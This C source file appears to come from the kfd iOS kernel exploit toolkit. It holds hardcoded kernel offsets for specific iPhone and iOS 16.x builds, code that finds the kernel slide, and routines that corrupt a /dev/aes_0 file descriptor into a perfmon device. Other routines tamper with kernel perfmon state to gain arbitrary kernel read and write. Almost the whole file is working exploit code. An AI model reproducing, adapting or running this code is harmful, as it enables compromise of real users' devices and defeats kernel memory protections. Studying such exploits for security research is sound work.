/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#include "perf.h"

const struct kernelcache_addresses kcs[] = {
    // iPhone 13 mini 16.5.1
    {
        .kernel_base                    = 0xfffffff007004000,
        .vn_kqfilter                    = 0xfffffff007f4a0d8,
        .ptov_table                     = 0xfffffff0078ef180,
        .gVirtBase                      = 0xfffffff00793a378,
        .gPhysBase                      = 0xfffffff00793c1a0,
        .gPhysSize                      = 0xfffffff00793c1a8,
        .perfmon_devices                = 0xfffffff00a4af520,
        .perfmon_dev_open               = 0xfffffff007efd570,
        .cdevsw                         = 0xfffffff00a471208,
        .vm_pages                       = 0xfffffff0078ebec0,
        .vm_page_array_beginning_addr   = 0xfffffff0078ee130,
        .vm_page_array_ending_addr      = 0xfffffff00a4ae988,
        .vm_first_phys_ppnum            = 0xfffffff00a4ae990,
    },
    // iPhoneSE2 16.6 beta1
    {
        .kernel_base                    = 0xfffffff007004000,
        .vn_kqfilter                    = 0xfffffff007f56588,
        .ptov_table                     = 0xfffffff0079079b8,
        .gVirtBase                      = 0xfffffff007952370,
        .gPhysBase                      = 0xfffffff0079541b8,
        .gPhysSize                      = 0xfffffff0079541c0,
        .perfmon_devices                = 0xfffffff00a4bd520,
        .perfmon_dev_open               = 0xfffffff007f07d78,
        .cdevsw                         = 0xfffffff00a47dab0,
        .vm_pages                       = 0xfffffff007904100,
        .vm_page_array_beginning_addr   = 0xfffffff007906958,
        .vm_page_array_ending_addr      = 0xfffffff00a4bc908,
        .vm_first_phys_ppnum            = 0xfffffff00a4bc910,
    },
};

void perf_init(struct kfd* kfd)
{
    char hw_model[16] = {};
    uintptr_t size = sizeof(hw_model);
    assert_bsd(sysctlbyname("hw.model", hw_model, &size, NULL, 0));
    print_string(hw_model);

    kfd->perf.kernelcache_index = -1;
    
    if(@available(iOS 16.5, *))
        kfd->perf.kernelcache_index = 0;
    if(@available(iOS 16.6, *))
        kfd->perf.kernelcache_index = 1;
    
    /*
     * Allocate a page that will be used as a shared buffer between user space and kernel space.
     */
    vm_address_t shared_page_address = 0;
    vm_size_t shared_page_size = pages(1);
    assert_mach(vm_allocate(mach_task_self(), &shared_page_address, shared_page_size, VM_FLAGS_ANYWHERE));
    memset((void*)(shared_page_address), 0, shared_page_size);
    kfd->perf.shared_page.uaddr = shared_page_address;
    kfd->perf.shared_page.size = shared_page_size;
}

void perf_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    kfd_assert((size != 0) && (size <= UINT16_MAX));
    kfd_assert(kfd->perf.shared_page.uaddr);
    kfd_assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    *config = (volatile struct perfmon_config){};
    config->pc_spec.ps_events = (struct perfmon_event*)(kaddr);
    config->pc_spec.ps_event_count = (uint16_t)(size);

    struct perfmon_spec spec_buffer = {};
    spec_buffer.ps_events = (struct perfmon_event*)(uaddr);
    spec_buffer.ps_event_count = (uint16_t)(size);
    assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_SPECIFY, &spec_buffer));

    *config = (volatile struct perfmon_config){};
}

void perf_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    kfd_assert((size != 0) && ((size % sizeof(uint64_t)) == 0));
    kfd_assert(kfd->perf.shared_page.uaddr);
    kfd_assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    volatile struct perfmon_source* source = (volatile struct perfmon_source*)(kfd->perf.shared_page.uaddr + sizeof(*config));
    volatile struct perfmon_event* event = (volatile struct perfmon_event*)(kfd->perf.shared_page.uaddr + sizeof(*config) + sizeof(*source));

    uint64_t source_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config);
    uint64_t event_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config) + sizeof(*source);

    for (uint64_t i = 0; i < (size / sizeof(uint64_t)); i++) {
        *config = (volatile struct perfmon_config){};
        *source = (volatile struct perfmon_source){};
        *event = (volatile struct perfmon_event){};

        config->pc_source = (struct perfmon_source*)(source_kaddr);
        config->pc_spec.ps_events = (struct perfmon_event*)(event_kaddr);
        config->pc_counters = (struct perfmon_counter*)(kaddr + (i * sizeof(uint64_t)));

        source->ps_layout.pl_counter_count = 1;
        source->ps_layout.pl_fixed_offset = 1;

        struct perfmon_event event_buffer = {};
        uint64_t kvalue = ((volatile uint64_t*)(uaddr))[i];
        event_buffer.pe_number = kvalue;
        assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_ADD_EVENT, &event_buffer));
    }

    *config = (volatile struct perfmon_config){};
    *source = (volatile struct perfmon_source){};
    *event = (volatile struct perfmon_event){};
}

void perf_run(struct kfd* kfd)
{
    const struct kernelcache_addresses* kc = &kcs[kfd->perf.kernelcache_index];

    /*
     * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
     */
    
    kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
    kfd_assert(kfd->perf.dev.fd > 0);

    kfd_assert(kfd->info.kernel.current_proc);
    uint64_t fd_ofiles_kaddr = kfd->info.kernel.current_proc + dynamic_offsetof(proc, p_fd_fd_ofiles);
    uint64_t fd_ofiles = 0;
    kread_kfd((uint64_t)(kfd), fd_ofiles_kaddr, &fd_ofiles, sizeof(fd_ofiles));

    uint64_t fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(uint64_t));
    uint64_t fileproc = 0;
    kread_kfd((uint64_t)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));

    uint64_t fp_glob_kaddr = fileproc + static_offsetof(fileproc, fp_glob);
    uint64_t fp_glob = 0;
    kread_kfd((uint64_t)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));

    uint64_t fg_ops_kaddr = unsign_kaddr(fp_glob) + static_offsetof(fileglob, fg_ops);
    uint64_t fg_ops = 0;
    kread_kfd((uint64_t)(kfd), fg_ops_kaddr, &fg_ops, sizeof(fg_ops));

    uint64_t fo_kqfilter_kaddr = unsign_kaddr(fg_ops) + static_offsetof(fileops, fo_kqfilter);
    uint64_t fo_kqfilter = 0;
    kread_kfd((uint64_t)(kfd), fo_kqfilter_kaddr, &fo_kqfilter, sizeof(fo_kqfilter));

    uint64_t vn_kqfilter = unsign_kaddr(fo_kqfilter);
    uint64_t kernel_slide = vn_kqfilter - kc->vn_kqfilter;
    uint64_t kernel_base = kc->kernel_base + kernel_slide;
    kfd->info.kernel.kernel_slide = kernel_slide;
    print_x64(kfd->info.kernel.kernel_slide);

    uint32_t mh_header[2] = {};
    mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
    mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
    assert(mh_header[0] == 0xfeedfacf);
    assert(mh_header[1] == 0x0100000c);

    /*
     * Set up some globals used by vm_page.h.
     */
    uint64_t vm_pages_kaddr = kc->vm_pages + kernel_slide;
    uint64_t vm_page_array_beginning_addr_kaddr = kc->vm_page_array_beginning_addr + kernel_slide;
    uint64_t vm_page_array_ending_addr_kaddr = kc->vm_page_array_ending_addr + kernel_slide;
    uint64_t vm_first_phys_ppnum_kaddr = kc->vm_first_phys_ppnum + kernel_slide;
    kread_kfd((uint64_t)(kfd), vm_pages_kaddr, &vm_pages, sizeof(vm_pages));
    kread_kfd((uint64_t)(kfd), vm_page_array_beginning_addr_kaddr, &vm_page_array_beginning_addr, sizeof(vm_page_array_beginning_addr));
    kread_kfd((uint64_t)(kfd), vm_page_array_ending_addr_kaddr, &vm_page_array_ending_addr, sizeof(vm_page_array_ending_addr));
    vm_first_phys_ppnum = kread_sem_open_kread_u32(kfd, vm_first_phys_ppnum_kaddr);

    /*
     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
     */
    uint64_t fg_data_kaddr = unsign_kaddr(fp_glob) + static_offsetof(fileglob, fg_data);
    uint64_t fg_data = 0;
    kread_kfd((uint64_t)(kfd), fg_data_kaddr, &fg_data, sizeof(fg_data));

    uint64_t v_specinfo_kaddr = unsign_kaddr(fg_data) + 0x0078; // offsetof(struct vnode, v_specinfo)
    uint64_t v_specinfo = 0;
    kread_kfd((uint64_t)(kfd), v_specinfo_kaddr, &v_specinfo, sizeof(v_specinfo));

    kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + 0x0018; // offsetof(struct specinfo, si_rdev)
    kread_kfd((uint64_t)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));

    uint64_t cdevsw_kaddr = kc->cdevsw + kernel_slide;
    uint64_t perfmon_dev_open_kaddr = kc->perfmon_dev_open + kernel_slide;
    uint64_t cdevsw[14] = {};
    uint32_t dev_new_major = 0;
    for (uint64_t dmaj = 0; dmaj < 64; dmaj++) {
        uint64_t kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
        kread_kfd((uint64_t)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
        uint64_t d_open = unsign_kaddr(cdevsw[0]);
        if (d_open == perfmon_dev_open_kaddr) {
            dev_new_major = (dmaj << 24);
            break;
        }
    }

    assert(dev_new_major == 0x11000000);

    uint32_t new_si_rdev_buffer[2] = {};
    new_si_rdev_buffer[0] = dev_new_major;
    new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
    kwrite_kfd((uint64_t)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));

    /*
     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
     */
    uint64_t ptov_table_kaddr = kc->ptov_table + kernel_slide;
    kread_kfd((uint64_t)(kfd), ptov_table_kaddr, &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));

    uint64_t gVirtBase_kaddr = kc->gVirtBase + kernel_slide;
    kread_kfd((uint64_t)(kfd), gVirtBase_kaddr, &kfd->info.kernel.gVirtBase, sizeof(kfd->info.kernel.gVirtBase));
    print_x64(kfd->info.kernel.gVirtBase);

    uint64_t gPhysBase_kaddr = kc->gPhysBase + kernel_slide;
    kread_kfd((uint64_t)(kfd), gPhysBase_kaddr, &kfd->info.kernel.gPhysBase, sizeof(kfd->info.kernel.gPhysBase));
    print_x64(kfd->info.kernel.gPhysBase);

    uint64_t gPhysSize_kaddr = kc->gPhysSize + kernel_slide;
    kread_kfd((uint64_t)(kfd), gPhysSize_kaddr, &kfd->info.kernel.gPhysSize, sizeof(kfd->info.kernel.gPhysSize));
    print_x64(kfd->info.kernel.gPhysSize);

    assert(kfd->info.kernel.current_pmap);
    uint64_t ttbr0_va_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, tte);
    uint64_t ttbr0_pa_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, ttep);
    kread_kfd((uint64_t)(kfd), ttbr0_va_kaddr, &kfd->info.kernel.ttbr[0].va, sizeof(kfd->info.kernel.ttbr[0].va));
    kread_kfd((uint64_t)(kfd), ttbr0_pa_kaddr, &kfd->info.kernel.ttbr[0].pa, sizeof(kfd->info.kernel.ttbr[0].pa));
    assert(phystokv(kfd, kfd->info.kernel.ttbr[0].pa) == kfd->info.kernel.ttbr[0].va);

    assert(kfd->info.kernel.kernel_pmap);
    uint64_t ttbr1_va_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, tte);
    uint64_t ttbr1_pa_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, ttep);
    kread_kfd((uint64_t)(kfd), ttbr1_va_kaddr, &kfd->info.kernel.ttbr[1].va, sizeof(kfd->info.kernel.ttbr[1].va));
    kread_kfd((uint64_t)(kfd), ttbr1_pa_kaddr, &kfd->info.kernel.ttbr[1].pa, sizeof(kfd->info.kernel.ttbr[1].pa));
    assert(phystokv(kfd, kfd->info.kernel.ttbr[1].pa) == kfd->info.kernel.ttbr[1].va);

    /*
     * Find the shared page in kernel space.
     */
    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);

    /*
     * Set up the perfmon device use for the master kread and kwrite:
     * - perfmon_devices[0][0].pmdv_config = kfd->perf.shared_page.kaddr
     * - perfmon_devices[0][0].pmdv_allocated = true
     */
    struct perfmon_device perfmon_device = {};
    uint64_t perfmon_device_kaddr = kc->perfmon_devices + kernel_slide;
    uint8_t* perfmon_device_uaddr = (uint8_t*)(&perfmon_device);
    kread_kfd((uint64_t)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
    assert((perfmon_device.pmdv_mutex[0] & 0xffffff00ffffffff) == 0x0000000022000000);

    perfmon_device.pmdv_mutex[1] = (-1);
    perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
    perfmon_device.pmdv_allocated = true;

    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(uint64_t));
    ((volatile uint32_t*)(perfmon_device_uaddr))[4] = 0;
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(uint64_t));
    ((volatile uint32_t*)(perfmon_device_uaddr))[5] = 0;
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(uint64_t));
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(uint64_t));
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(uint64_t));

    kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
    kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
    kfd->kread.krkw_method_ops.kread = perf_kread;
    kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
}

void perf_free(struct kfd* kfd)
{

    kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
    kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;

    /*
     * Restore the "/dev/perfmon_core" descriptor back to the "/dev/aes_0" descriptor.
     * Then, close it and deallocate the shared page.
     * This leaves the first perfmon device "pmdv_allocated", which is fine.
     */
    kwrite_kfd((uint64_t)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));

    assert_bsd(close(kfd->perf.dev.fd));
    assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
}

/*
 * Helper perf functions.
 */

uint64_t phystokv(struct kfd* kfd, uint64_t pa)
{
    const uint64_t PTOV_TABLE_SIZE = 8;
    const uint64_t gVirtBase = kfd->info.kernel.gVirtBase;
    const uint64_t gPhysBase = kfd->info.kernel.gPhysBase;
    const uint64_t gPhysSize = kfd->info.kernel.gPhysSize;
    const struct ptov_table_entry* ptov_table = &kfd->info.kernel.ptov_table[0];

    for (uint64_t i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }

    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
    return pa - gPhysBase + gVirtBase;
}

uint64_t vtophys(struct kfd* kfd, uint64_t va)
{
    const uint64_t ROOT_LEVEL = PMAP_TT_L1_LEVEL;
    const uint64_t LEAF_LEVEL = PMAP_TT_L3_LEVEL;

    uint64_t pa = 0;
    uint64_t tt_kaddr = (va >> 63) ? kfd->info.kernel.ttbr[1].va : kfd->info.kernel.ttbr[0].va;

    for (uint64_t cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
        uint64_t offmask, shift, index_mask, valid_mask, type_mask, type_block;
        switch (cur_level) {
            case PMAP_TT_L0_LEVEL: {
                offmask = ARM_16K_TT_L0_OFFMASK;
                shift = ARM_16K_TT_L0_SHIFT;
                index_mask = ARM_16K_TT_L0_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L1_LEVEL: {
                offmask = ARM_16K_TT_L1_OFFMASK;
                shift = ARM_16K_TT_L1_SHIFT;
                index_mask = ARM_16K_TT_L1_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L2_LEVEL: {
                offmask = ARM_16K_TT_L2_OFFMASK;
                shift = ARM_16K_TT_L2_SHIFT;
                index_mask = ARM_16K_TT_L2_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L3_LEVEL: {
                offmask = ARM_16K_TT_L3_OFFMASK;
                shift = ARM_16K_TT_L3_SHIFT;
                index_mask = ARM_16K_TT_L3_INDEX_MASK;
                valid_mask = ARM_PTE_TYPE_VALID;
                type_mask = ARM_PTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_L3BLOCK;
                break;
            }
            default: {
                assert_false("bad pmap tt level");
                return 0;
            }
        }

        uint64_t tte_index = (va & index_mask) >> shift;
        uint64_t tte_kaddr = tt_kaddr + (tte_index * sizeof(uint64_t));
        uint64_t tte = 0;
        kread_kfd((uint64_t)(kfd), tte_kaddr, &tte, sizeof(tte));

        if ((tte & valid_mask) != valid_mask) {
            return 0;
        }

        if ((tte & type_mask) == type_block) {
            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
            break;
        }

        tt_kaddr = phystokv(kfd, tte & ARM_TTE_TABLE_MASK);
    }

    return pa;
}